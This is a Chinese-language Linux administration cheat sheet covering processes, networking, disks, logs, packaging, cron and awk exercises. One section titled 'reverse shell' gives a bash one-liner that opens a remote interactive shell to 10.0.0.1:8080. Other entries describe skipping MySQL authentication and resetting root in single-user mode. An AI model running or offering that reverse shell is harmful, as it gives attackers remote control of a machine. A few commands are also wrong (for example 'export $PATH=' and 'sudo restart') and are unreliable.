# linux系统检查的一般步骤

`who` 或 `w`  #谁在线

`whoami`  #我是谁

`pkill -KILL -t pts/0`  #强制用户退出

`last -n 10` #最近10个登录用户信息

`lastlog` #最近登录信息

`write username pts/3`  #向某个控制台用户username发送信息

`ifconfig -a`  #查看网卡配置

`cat /etc/sysconfig/network-scripts/ifcfg-enp7s0f0`  #查看默认网卡配置

`ctrl+d`  #退出信息编辑

`ctrl+r`  #递归查找命令历史

`pkill -kill -t pts/3`  #踢掉某个在线控制台

`tail -100f /var/log/audit/audit.log`  #查看授权日志

`history -n 100`  #查看历史命令

`pstree -a`  #查看进程数

`ps aux`  #查看所有进程

`ps -A --sort -rss -o comm,pmem,pcpu | uniq -c | head -15` # 查看cpu占用最高的15个进程

`ss -s` #查看socket状态

`netstat -ntlp`  #监听的tcp服务

`netstat -nulp` #监听的udp服务

`netstat -nxlp` #监听的所有服务

`netstat -lpnut`  #查看打开的端口

`netstat -tunl | grep 9000`  #查看9000端口

`lsof -i :端口号`  #查看对应端口的服务

`free -m`   #内存和交换区使用情况

`uptime`   #在线时间

`top`     #进程资源占用信息

`sestatus`  #selinux状态

`mount`  #系统挂载信息

`cat /etc/fstab`  #查看文件系统信息

`vgs`  #卷组系统

`pvs`  #物理卷系统

`lvs`  #逻辑卷系统

`df -lh`  #显示磁盘容量使用情况

`df -i [/var]`  #显示磁盘节点使用情况

`ls -lht`    #查看文件/文件夹大小

`du -sh *`   #查看目录大小

`lsof +D /path`  #列出目录中被打开的文件数

`dmesg`  #查看开机启动信息

`cat /proc/meminfo`  #内存信息

`less /var/log/messages`  #整体系统信息日志

`less /var/log/dmesg`  #内核缓冲信息日志

`less /var/log/auth.log`  #系统授权气质

`less /var/log/boot.log`  #系统启动日志

`less /var/log/lastlog`  #最近登录用户信息

`less /var/log/cups`  #所有打印信息日志

`less /var/log/secure`  #验证和授权信息日志

`last -f /var/log/wtmp`  #登录信息

`sleep 1`   #1秒

`sleep 1s`  #1秒

`sleep 1m`  #1分钟

`sleep 1h`  #1小时

`dd if=/dev/fd0 of=/tmp/tmpfile`  #将/dev/fd0文件复制到/tmp/tmpfile

`dd if=file1 of=file2`  #将file1的内容覆盖file2

`tcpdump -i eth0 src host hostname`  #截获主机hostname发送的所有数据

`tcpdump -i eth0 dst host hostname`  #监视所有发送到主机hostname的数据包

`tcpdump tcp|udp port 80 host hostname` #监视所有发送到主机hostname 80端口的数据包 

`alias bb='aa'` #设置命令aa的别名bb

`unalias bb`  #取消别名bb

`export $PATH=/usr/local/cmake/bin:$PATH`   #添加临时环境变量

`unset [-fv] [变量名]`

`command &`  #让命令自动运行, 已经启动的命令依然attach于当前pts, 只有当前终端模拟器关闭或exit退出时, 进程将被tty继承

`nohup command &`  #不挂起的方式在后台执行命令, 输出结果将保存到nohup.out文件中

`Ctrl+Z`  #将当前运行的进程放到后台运行

`passwd -l user_name`   #锁定用户

`passwd -u user_name`   #解锁用户

`wget [-cr] url` #递归断点下载

`ssh -p port user@host`  #指定端口ssh登录

`ssh -l user host`

`groups user` #查看user所属组

`id root` #查看root用户的id

`\t  缩进   \n  回车    \r   换行    \b  一个黑点  \续行`

`\cp file /path/to/` #直接覆盖拷贝, 不提示

<br/>

# 查看系统tcp连接中各个状态的连接数

`netstat -an | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'`

# 查看和本机80端口建立连接并状态在established的所有ip

`netstat -an |grep 80 |grep ESTA |awk '{print$5 "\n"}' |awk 'BEGIN {FS=":"} {print $1 "\n"}' |sort |uniq`

# 输出每个ip的连接数，以及总的各个状态的连接数

`netstat -n | awk '/^tcp/ {n=split($(NF-1),array,":");if(n<=2)++S[array[(1)]];else++S[array[(4)]];++s[$NF];++N} END {for(a in S){printf("%-20s %s\n", a, S[a]);++I}printf("%-20s %s\n","TOTAL_IP",I);for(a in s) printf("%-20s %s\n",a, s[a]);printf("%-20s %s\n","TOTAL_LINK",N);}'`

# 查看僵尸进程

`ps -A -o stat,ppid,pid,cmd | grep -e '^[Zz]'`

# 释放内存

`echo 3 > /proc/sys/vm/drop_caches`

<br/>

# 目录颜色问题

> 蓝色表示目录；

> 绿色表示可执行文件；

> 红色表示压缩文件；

> 浅蓝色表示链接文件；

> 灰色表示其他文件；

> 红色闪烁表示链接的文件有问题；

> 黄色是设备文件。

<br/>

# 总核数 = 物理CPU个数 X 每颗物理CPU的核数

# 总逻辑CPU数 = 物理CPU个数 X 每颗物理CPU的核数 X 超线程数

# 查看物理CPU个数

`cat /proc/cpuinfo| grep "physical id"| sort| uniq| wc -l`

# 查看每个物理CPU中core的个数(即核数)

`cat /proc/cpuinfo| grep "cpu cores"| uniq`

# 查看逻辑CPU的个数

`cat /proc/cpuinfo| grep "processor"| wc -l`

`cat /proc/cpuinfo |grep MHz|uniq` #查看CPU的主频

`cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c`  #查看cpu型号

`cat /proc/cpuinfo | grep "core id" | uniq | wc -l`  #所有物理cpu上core的个数

`getconf LONG_BIT` #查看位数

`lscpu`  #查看cpu信息概要

`arch`   #查看cpu架构

# 进入单用户模式

> 在系统启动过程中, 按下e进入grub, 再次按下e进入启动选项, 选择kernel所在行, 输入single回车, 输入b重启. 进入系统后就是单用户模式了, 你可以修改root密码.


# 升级glibc
`lsof | grep libc | awk '{print $1}' | sort`  #查看依赖glibc的服务

`yum -y update glibc` #升级glibc

`sudo restart`  #重启系统

# kill命令相关

> 当你执行一个`kill`命令, 你实际上发送了一个信号给系统, 让它去终结不正常的应用.

`kill -l`  #查看所有信号列表

> 常用的信号也就`1) SIGHUP`, `2) SIGINT`, `9) SIGKILL`, `15) SIGTERM`, `10) SIGUSR1`, `12) SIGUSR2`

> `SIGHUP`信号请求挂起进程, 也可用于在修改配置以后重载进程.

> `SIGINT`信号请求中断一个信号.

> `SIGKILL`信号强制进程立刻停止运行, 进程不能忽略此信号, 而未保存的进度将会丢失.

> `SIGUSR1`信号请求进程重新载入配置文件, 比如向nginx服务器发送该信号, 可以重载配置, 重新打开日志文件.

> `SIGUSR2`信号与`SIGUSR1`类似, 可用于重启某些服务.

> `SIGTERM`信号请求一个进程停止运行, 进程可以忽略. 进程需要一段时间保存进度并释放资源, 然后再正常关闭.

`kill [信号名或信号编号] PID(s)` #发送信号给进程, 多个进程id之间用空格隔开

`kill SIGKILL 8080` 或者 `kill -9 8080`  #杀死进程id为8080的服务

`pkill chrome` #pkill允许使用扩展的正则表达式匹配服务

`killall chrome`  #killall会杀死所有同名进程

`xkill` #xkill是图形方式kill一个应用, 一般不用
<br/>

# 定时任务
```
/etc/crontab  编辑定时任务后需要重启crond服务
crontab -e    编辑保存后即可生效
分      小时    日    月       星期    命令
0-59    0-23    1-31  1-12     0-6      command
* 代表取值范围内任意数字
/x 代表每隔x
- 代表从x到y
, 用于离散数字
```

`tar czvf file.tar files`  #压缩files为file.tar 

`tar xf file.tar`   #解压file.tar到当前目录

`tar -tvf file.tar`  #不解压tar包查看内容

`tar zxvf xxx.tar.gz -C /usr/local/xxx`  #指定路径

`tar xvf xxx.tar`

`tar jxvf xxx.tar.bz2`

`xz -d xxx.tar.xz`

`unzip xxx.zip`

`unzip -r xxx.zip abc.txt dir1` #把abc.txt和目录dir1压缩为xxx.zip

`unzip abc\?.zip` #解压多个匹配的压缩包

`unzip -v large.zip`  #查看large.zip的内容

`unzip -t large.zip` #验证large.zip是否完整

`unzip -j music.zip`  #解压到第一级目录

`rpm -ivh  --prefix=/usr/local/xxx xxx.rpm`  #指定安装路径

`rpm -Uvh xxx.rpm`  #升级安装软件包

`rpm -e --nodeps xxx.rpm`  #删除制定包，忽略依赖包

`rpm -ivh *.rpm --force --nodeps`   强制安装

`rpm --import /etc/pki/rpm-gpg/RPM*`    导入密钥

`rpm -ql xxx`  #查看软件安装位置

# find pathname -options [ -print -exec -ok ...]

```
pathname 目录路径，.表示当前目录，/表示根目录
-print 输出到标准输出中
-exec 对匹配的文件执行该参数所给出的shell命令
-ok 对话形式完成shell命令
-name 按照文件名查找文件
-perm 按照文件权限查找文件
-user  根据文件属主查找文件
-type  吵着某一类型文件
xargs  配合find将参数列表转换成小块分段传递给其他命令。
反引号`` 用于变量转义为shell命令被执行
find /path -type f -exec rm '{}' \  #删除目录下所有文件
find ./ -type d -exec chmod 755 {} \; #当前目录下所有目录赋权755
 xargs 命令传递参数过滤器
find ./ -name '*.log' | xargs ls -l  #把当前目录下所有log文件的详细信息列出
find ./ -name '*.log' | xargs rm -f  #删除
```

# 用户、组权限、添加删除用户等
```
/etc/passwd  
daemon:x:2:2:daemon:/sbin:/sbin/nologin 
注册名：口令：UID：GID：user：user_home：user_shell
/etc/shadow  需管理员权限, 与/etc/passwd一一对应
/etc/group 
用户组：口令：GID:user
/etc/gshadow
useradd  [-c comment] [-d home_dir] [-e expire_date] [-f inactive_time] [-g inital_group] [-G group] [-s shell] [-m] username
userdel  [-r] username     #带参数则同时删除家目录和邮箱文件
userdel -f username        #强制删除用户, 即使用户已经登录
usermod [option] username  #修改用户帐号的各项设定
groupadd [-g gid] [-o] [-r] [-f] group  #新增组
groupdel group  #删除组
groupmod [-g gid] [-n gid_new] #修改群组识别码或名称
passwd [-l] [-u] [-d] [-S] username #操作用户密码
-l 锁定 -u 解锁 -d 删除口令 -S 查看状态
su - [user]   #切换到指定用户的变量, 缺省为root
su [user]     #切换到指定用户, 不改变当前变量, 缺省为root
```

# cut [-bn] [file] 或 cut [-c] [file] 或 cut [-df] [file]

```
-b：以字节为单位分割; -c：以字符为单位分割; -n：取消分割多字节字符，与-b一起使用;
-d：自定义分隔符，默认为制表符; -f: 与-d一起使用，指定显示哪个区域;
who | cut -b 3-5,8 #显示第3到第5个字节，第8个字节
who cut -b 3- #显示从第三个字节到行尾
who cut -b -3 #显示第一到第三个字节
cut -b 3 aaa.txt #显示aaa.txt每行第三个字符
cat /etc/passwd | cut -d: -f 1,3-5  #以:为分隔符，显示第1列，第3到第5列
判断空格和制表符:  sed -n l aa.txt  #若为制表符,则显示\t
cat /home/aa.txt | cut -f 1 #以制表符为分隔符，显示第一列
```

# lsof
```
lsof -i:22 显示22端口运行情况
lsof -i :1-1024 列出端口在1-1024之间的所有进程
lsof -i 4 只列出使用IPv4的打开文件
lsof file_name 显示打开指定文件的所有进程
lsof -c str  显示cmd中包含指定字符的进程
lsof -u user_name 显示指定用户名的进程
lsof +D /dir/ 显示目录下被进程打开的文件
lsof -p PID 根据进程id来列出打开的文件
killall -9 `lsof -t -u username`  杀死某个用户的所有活动进程
lsof –n | grep deleted  查找已删除文件的读写操作
```

# 挂载外接设备

```
fdisk -l   查看磁盘分区情况
mount -t vfat /dev/sdb /mnt/usb
mount -t ntfs-3g /dev/sdb /mnt/winC
mount -t iso9660 /dev/cdrom /mnt/cdrom  
umonut /mnt/xxx  #卸载
badblocks -v /dev/sda  查看挂载硬盘是否有坏块
mdadm /dev/md0 -remove /dev/sdc1   删除一块硬盘
mdadm /dev/md0 -add /dev/sdc1  添加一块硬盘
cat /proc/mdstat   查看磁盘阵列信息
fdisk /dev/sdb  对磁盘编辑分区
n 创建新分区  p 创建主分区  e 创建扩展分区  
1 创建第一个主分区  t 指定分区类型   w 写盘  
mdadm -C /dev/md0 -l5 -n3 /dev/sd[bcd]1 在三个分区上创建raid5
mkfs.ext3 /dev/md0  格式化md0分区
make  /raid5disk
mount /dev/md0 /raid5disk/
/etc/fstab  设置为自动挂载
mdadm -D /dev/md0  查看md0
```

# sort [-bcfMnrtk] [源文件] [-o 输出文件]

```
-b 忽略每行前面开始出现的空格字符
-c 检查文件是否已按照顺序排序
-f 排序时，忽略大小写
-M 将前面3个字母按月份的缩写进行排序
-n 依照数值的大小进行排序
-o<输出文件> 将排序结果存入指定文件
-r 以相反顺序排序
-t<分隔符> 指定排序时所用的栏位分割字符
-k 选择以哪个区间进行排序
-u 去除重复行
sort a.txt > b.txt  对a.txt中内容排序后将结果保存在b.txt
sort -n -k 2 -t ‘:’ a.txt    #对a.txt中内容按第2区间数值大小排序，分隔符为’:’
```

# cURL 网络传输工具 不支持跳转

```
curl --head|-I http://www.baidu.com/  #返回header
curl --connect-timeout 3 -m 5 -I -s "http://search.sotuhcn.com/index.jsp" | grep -q 'HTTP/1.1 200 OK'
-H/--header <header> 指定请求头
-s/--slient 减少输出的信息，比如进度
-x/--proxy <proxyhost[:port]> 指定代理服务器地址和端口，默认端口1080
-d/--data/--data--data-ascii <data> 指定post的内容
-e/--referer <URL>指定引用地址
-I/--head 仅返回头部信息
-v/--verbose  用于打印更多信息
-m/--max-time <seconds>  指定处理的最大时长
--connect-timeout <seconds>  指定尝试连接的最大时长
-o/--output <file> 指定输出文件名称
-T/--upload-file <file> 指定上传文件路径
--retry <num> 指定重试次数
```
# ssh启动失败, 缺失共享库文件怎么办?

```
mount /dev/sr0 /mnt/cdrom 
rpm -ivh /123/Packages/yum*
rpm -ivh /123/Packages/yum-3.2.29-30.el6.centos.noarch.rpm --froce
rpm -ivh /123/Packages/yum-3.2.29-30.el6.centos.noarch.rpm --force
ll /etc/yum.repos.d/
yum install openssh*
rpm -ivh /123/Packages/openssl* --force
rpm -ivh /123/Packages/openssl-1.0.0-20.el6_2.5.i686.rpm --force
rpm -ivh /123/Packages/openssl-devel-1.0.0-20.el6_2.5.i686.rpm --force
rpm -ivh /123/Packages/openssl* --nodeps
yum install openssh*
yum update openssl
service sshd start
service sshd restart
yum remove openssl*
yum remove openssl
yum install -y yum-downloadonly openssl
yum install -y yum-downloadonly --downloaddir=/opt openssl
yum install -nogpgcheck openssl_need_to_instaal
service sshd start
init 6
logout
```
<br/>

# 用户间发送消息（以CentOS为例）
## 1、wall '...'

> wall是给所有用户发送消息, 消息内容用''包含

## 2、write userName tty

> 先用`who`命令查看在线的用户以及他们的tty, 然后用`write`命令给他发消息

> 输入`write`就进入了消息模式, 此时输入消息内容, 回车就可以发送. 退出按`Ctrl+D`

## 3、mesg

> 如果不希望接受其他用户write的消息, 用`mesg -n`关闭, 再次开启用`mesg -y`

## 后台进程退出

> 用Ctrl+Z可将当前任务放在后台执行，执行完成之前，不能用logout来退出终端。

> 可以用fg %1查看并停止该任务，用kill %1彻底结束任务。

<br/>

## tee命令

> 双向重定向, 同时将数据流送与文件和屏幕, 而输出到屏幕的就是stdout, 可以让下一命令继续处理.

`last | tee -a last.list | sed -n '1p'`

# io检测

`yum install iotop`

`yum install sysstat`

`iostat -d -x -k 2 10` #查看设备使用状态,-x表示扩展信息,-k强制使用kb为单位,每2秒刷新一次,10次后退出

`iostat -d sda 2 10` #指定设备sda

`iostat -d -m 2`  #以mb为单位

`iostat -c 1 10`  #cpu状态信息

```
rrqm/s:  每秒进行merge的读操作数目
wrqm/s: 每秒进行merge的写操作数目
r/s: 每秒完成读I/O设备次数
rsec/s: 每秒读扇区数
wsec/s: 每秒写扇区数
rkB/s wkB/s  每秒读写K字节数
avgrq-sz: 平均每次设备I/O操作的数据大小(扇区)
avgqu-sz: 平均I/O队列长度
await: 平均每次设备I/O操作的等待时间（await大于svctm）
svctm: 平均每次设备I/O操作的服务时间
%util:  一秒中用于I/O操作的时间占比
```

# 测试io读

`hdparm -t --direct /dev/sda3`

# 测试io写

`sync;`

`/usr/bin/time -p bash -c "(dd if=/dev/zero of=test.dd  bs=1000K count=20000;sync)"`  #先刷新文件系统缓冲区,time命令用户测试命令执行时间,bash -c 表示将后面的字符串当脚本执行

`dd bs=1M count=20000 if=/dev/zero of=test.dd conv=fdatasync`  #dd命令测试IO顺序读写

<br/>

# sysctl命令相关

`sysctl -a` #显示所有系统参数

`sysctl -a | grep syn`  #查看SYN相关参数

`sysctl -w net.ipv4.tcp_syn_retries = 3`  #修改tcp_syn_retries次数

`sysctl -w net.ipv4.tcp_synack_retries = 3` #修改tcp_synack_retries参数

<br/>

# 反弹shell

`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

<br/>

# 解决task nrpe: blocked for more than 120 seconds

> 原理：linux会设置40%的可用内存用来做系统cache，当flush数据时这40%内存中的数据由于和IO同步问题导致超时(120s)，所将40%减小到10%，避免超时

> 在文件/etc/sysctl.conf中加入 vm.dirty_ratio=10

<br/>

# 关闭`/var/spool/mail/root`提醒

`vim /etc/profile`

`unset MAILCHECK`

`source /etc/profile`

<br/>


# top命令

```
load average: 0.18, 0.19, 0.90
系统负载,任务队列的平均长度. 分别是1分钟/5分钟/15分钟到现在的平均值.

Tasks: 892 total,   1 running, 891 sleeping,   0 stopped,   0 zombie
进程总数892个,1个运行中,891个睡眠,0个停止,0个僵尸.

Cpu(s):  0.1%us,  0.0%sy,  0.0%ni, 99.9%id,  0.0%wa,  0.0%hi,  0.0%si,  0.0%st
用户空间us,内核空间sy,用户进程空间改变过优先级的进程ni,空闲id,等待wa,


Mem:  32798616k total, 30971312k used,  1827304k free,   139884k buffers
内存信息: 总量, 已使用, 空闲, 用作内核缓存的

Swap: 30716272k total,    17444k used, 30698828k free, 29417708k cached
交换区: 总量,已使用,空闲,缓冲

PID #进程id
USER #用户
PR  #优先级
NI  #nice值,数值越小优先级越高
VIRT  #进程使用的虚拟内存总量 VIRT=SWAP+RES
RES  #进程使用的、未被患处的物理内存大小,单位kb RES=CODE+DATA
SHR #共享内存
S  #进程状态,S=睡眠,R=运行,Z=僵尸,D=不可中断的睡眠状态
%CPU  #CPU时间占用百分比
%MEM   
TIME+  #进程使用的CPU时间总计
COMMAND #进程命令


交互模式下的参数
c #切换显示模式
d #改变刷新频率
i #不显示闲置进程
n #更新次数
q #实时
s #安全模式
M #按%Mem排行
P #按%CPU排行
T #按TIME+排行
```

<br/>

# 流量监控工具iftop安装与使用

```
# 先安装依赖
yum install -y flex byacc libpcap ncurses ncurses-devel libpcap-devel

# 安装libpcap
wget -c http://www.tcpdump.org/release/libpcap-1.8.1.tar.gz
tar zxvf libpcap-1.8.1.tar.gz
cd libpcap-1.8.1
./configure
make && make install

# 安装iftop
yum install flex byacc libpcap ncurses ncurses-devel libpcap-devel
wget -c http://www.ex-parrot.com/pdw/iftop/download/iftop-0.17.tar.gz
tar zxvf iftop-0.17.tar.gz
cd iftop-0.17.tar.gz
./configure
make && make install

# iftop使用
iftop 
[-i eth0] #指定监测的网卡
[-B] #以bytes为单位,默认是bits
[-n] #使host信息默认直接显示ip
[-N] #使端口信息默认显示端口号
[-F 10.10.1.0/24] #指定网段进出流量

```

<br/>

# php程序502排查
`netstat -anpo | grep "php-fpm" | wc -l`  #查看php-fpm连接数

`cat nginx.conf`  #查看fastcgi-conncet-timeout等参数值

`cat php.ini`  #增大memory_limit值, 一般设为内存的1/4

`cat php-fpm.conf`  #max_children值 

`netstat -np | grep 127.0.0.1:9000` #统计php-fpm连接数

`pgrep php-fpm | head -10`  #查看php-fpm进程号pid

<br/>

# ssh登录很慢的问题解决

`vi /etc/ssh/sshd_config`

`UseDNS no`

<br/>

# mysql重置密码

先停止mysql服务`service mysqld stop`, 然后以不检查权限方式启动服务`./mysqld_safe --skip-grant-tables &`, 就可以无密码登录了.

<br/>

# psftp命令

`help` #查看帮助

`open abc.edu` #连接到abc.edu   

`! md test`  #执行DOS指令建立一个test目录 

`binary`  #二进制

`passive`  #主动模式

`bye` #结束离开 exit也有相同效果

`cd test`  #切换远端主机工作目录至test

`chmod 700 abc.txt` #把文件abc.txt 设成本人才能存取！

`del 111.bmp`  #删除文件111.bmp rm指令效果相同

`dir` #显示目前目录中的文件 

`get 321.doc` #下载文件321.doc 

`mget aa.txt bb.txt` 下载多个文件

`lcd c:\windows` #切换本机工作目录至c:\windows

`mkdir test` #建立目录test 

`put 555.txt`  #上传文件555.txt 

`mput aa.txt bb.txt`  #传多档

`pwd` #显示目前所在的目录位置(远端主机) 

`ren 123.txt myfile.txt`  #把文件123.txt档名改成myfile.txt mv指令亦可

`rmdir test` #删除目录test

<br/>

# 一些概念

`shell`：直接和内核进行通信。

`xterm`: 是软件概念，可以通过这个程序连接到`console`，从而控制主机。可以理解为cli形式的终端模拟器，而gnome-terminal是gui形式的终端模拟器。

`console`：是主机的控制台，是一个物理概念。

`tty/pty/pts`都是终端，是硬件或设备概念。

`tty`是所有终端设备的总称。

`pty`是其中一类伪终端，或者叫虚拟终端。

# 一些题目

## 1、输出一个文件的第十行，以下三种方法

`awk 'NR == 10' file.txt`

`sed -n '10p' file.txt`

`tail -n+10 file.txt | head -n1`

## 2、输出有效的电话号码

`cat file.txt | grep -Eo '^(\([0-9]{3}\) ){1}[0-9]{3}-[0-9]{4}$|^([0-9]{3}-){2}[0-9]{4}$'`

`^(\([0-9]{3}\) ){1}[0-9]{3}-[0-9]{4}$` 匹配形如(123) 456-7890的电话号码

`^([0-9]{3}-){2}[0-9]{4}$` 匹配形如987-123-4567的电话号码

## 3、转置文件内容

> 比如file.txt内容如下：

> aaa  bbb

> ccc  ddd

> 则输出

> aaa   ccc

> bbb  ddd

`awk ' { for (i = 1; i <= NF; i++) { a[NR, i] = $i } } NF > p { p = NF } END { for (j = 1; j <= p; j++) { str = a[1, j] for (i = 2; i <= NR; i++){ str = str " " a[i, j] } print str } }' file.txt`

## 4、词频统计

`cat words.txt | tr -s ' ' '\n' | sort | uniq -c | sort -rn | awk '{print $2" "$1}'`

> tr -s: 使用指定字符串替换出现一次或者连续出现的目标字符串（把一个或多个连续空格用换行符代替）

> sort: 将单词从小到大排序

> uniq -c: uniq用来对连续出现的行去重，-c参数为计数

> sort -rn: -r 倒序排列， -n 按照数值大小排序

> awk '{ print $2, $1 }': 格式化输出，将每一行的内容用空格分隔成若干部分，$i为第i个部分。

## 5.统计/etc/passwd的文件名，行号，列数，每行内容

`awk  -F ':'  '{printf("filename:%10s,linenumber:%s,columns:%s,linecontent:%s\n",FILENAME,NR,NF,$0)}' /etc/passwd`

## 6.统计用户个数

`awk 'BEGIN {count=0;print "[start]user count is ", count} {count=count+1;print $0;} END{print "[end]user count is ", count}' /etc/passwd`

## 7.以MB为单位统计某个文件夹下的文件占用字节数，不包括子目录

`ls -l | awk 'BEGIN {size=0;} {if($5!=4096){size=size+$5;}} END{print "[end]size is ", size/1024/1024,"M"}'`

`ls -l | grep "^-" | wc –l`   #统计文件个数

`ls -l | grep "^d" | wc –l`   #统计目录个数

`ls -lR | grep "^-" | wc –l`  #统计所有文件个数，包括子目录
